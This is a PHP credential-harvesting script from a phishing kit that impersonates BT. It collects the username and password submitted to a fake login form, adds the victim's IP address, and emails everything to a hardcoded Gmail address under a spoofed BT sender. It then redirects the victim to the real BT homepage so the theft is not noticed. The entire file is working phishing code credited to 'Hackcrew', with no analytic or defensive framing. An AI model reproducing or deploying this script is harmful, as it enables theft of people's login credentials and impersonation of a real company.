<?
$ip = getenv("REMOTE_ADDR");
$message .= "\n";
$message .= "Username: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By Hackcrew---------------------\n";
$send = "abigailbrinsley4@gmail.com";
$subject = "$ip - ".$_POST['username']."\n";
$from = "From: BT <inContact@incontact.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", "$message", $from); 
header("Location:  http://home.bt.com/");	  

?>

			